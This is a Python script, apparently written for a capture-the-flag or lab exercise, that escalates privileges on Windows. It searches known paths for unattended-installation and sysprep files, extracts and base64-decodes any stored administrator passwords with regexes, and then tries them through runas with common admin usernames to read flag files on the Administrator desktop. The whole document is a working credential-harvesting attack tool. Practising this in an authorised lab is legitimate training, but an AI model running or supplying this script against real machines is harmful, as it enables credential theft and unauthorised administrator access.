#!/usr/bin/env python3
"""
Windows Privilege Escalation Script - Educational Lab
Searches for unattended installation files and extracts admin passwords
"""

import os
import re
import base64
import subprocess
import sys


def find_unattended_files():
    """Search for common unattended installation files"""
    common_locations = [
        r"C:\Windows\Panther\Unattend.xml",
        r"C:\Windows\Panther\Unattended.xml",
        r"C:\Windows\system32\sysprep\sysprep.inf",
        r"C:\Windows\system32\sysprep\sysprep.xml",
        r"C:\Windows\Panther\Unattend\Unattended.xml",
        r"C:\Windows\System32\sysprep\Panther\Unattend.xml",
        r"C:\sysprep.inf",
        r"C:\autounattend.xml",
        r"C:\Unattend.xml"
    ]

    found_files = []

    print("[*] Searching for unattended installation files...")

    for location in common_locations:
        if os.path.exists(location):
            print(f"[+] Found file: {location}")
            found_files.append(location)

    return found_files


def extract_password_from_file(file_path):
    """Extract administrator password from unattended file"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        # Search for administrator password patterns
        patterns = [
            r'<AdministratorPassword>\s*<Value>(.*?)</Value>',
            r'<Password>\s*<Value>(.*?)</Value>',
            r'AdminPassword\s*=\s*([^\r\n]+)',
            r'<Password>(.*?)</Password>'
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
            if matches:
                return matches[0].strip()

    except Exception as e:
        print(f"[!] Error reading file {file_path}: {e}")

    return None


def decode_password(encoded_password):
    """Decode the extracted password if it's base64 encoded"""
    try:
        # Try to decode as base64
        decoded = base64.b64decode(encoded_password).decode('utf-8')
        return decoded
    except:
        # If not base64, return as is
        return encoded_password


def run_as_admin(username, password):
    """Attempt to run command as administrator using runas"""
    try:
        # Create a batch file to run the command
        batch_content = f"""
@echo off
echo [*] Attempting to access admin desktop...
dir C:\\Users\\Administrator\\Desktop\\
type C:\\Users\\Administrator\\Desktop\\flag.txt 2>nul
if exist C:\\Users\\Administrator\\Desktop\\0-flag.txt (
    type C:\\Users\\Administrator\\Desktop\\0-flag.txt
) else (
    echo [!] Flag file not found
)
pause
"""

        with open('temp_admin.bat', 'w') as f:
            f.write(batch_content)

        # Use runas to execute as admin
        cmd = f'runas /user:{username} "cmd /c temp_admin.bat"'
        print(f"[*] Running: {cmd}")
        print(f"[*] When prompted, enter password: {password}")

        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True)

        # Clean up
        try:
            os.remove('temp_admin.bat')
        except:
            pass

        return result.returncode == 0

    except Exception as e:
        print(f"[!] Error running as admin: {e}")
        return False


def main():
    """Main function to orchestrate the privilege escalation"""
    print("="*50)
    print("Windows Privilege Escalation - Lab Exercise")
    print("="*50)

    # Step 1: Find unattended files
    found_files = find_unattended_files()

    if not found_files:
        print("[!] No unattended installation files found")
        return

    # Step 2: Extract passwords from files
    extracted_passwords = []

    for file_path in found_files:
        print(f"\n[*] Analyzing file: {file_path}")
        password = extract_password_from_file(file_path)

        if password:
            print(f"[+] Found password: {password}")
            decoded_password = decode_password(password)
            print(f"[+] Decoded password: {decoded_password}")
            extracted_passwords.append(decoded_password)

    if not extracted_passwords:
        print("[!] No passwords found in unattended files")
        return

    # Step 3: Attempt to use credentials
    print("\n[*] Attempting to use extracted credentials...")

    for password in extracted_passwords:
        print(f"\n[*] Trying password: {password}")

        # Try common admin usernames
        admin_users = ['Administrator', 'admin', 'LAB01\\Administrator']

        for username in admin_users:
            print(f"[*] Trying username: {username}")
            if run_as_admin(username, password):
                print(f"[+] Successfully authenticated as {username}")
                break
            else:
                print(f"[!] Failed to authenticate as {username}")


if __name__ == "__main__":
    main()
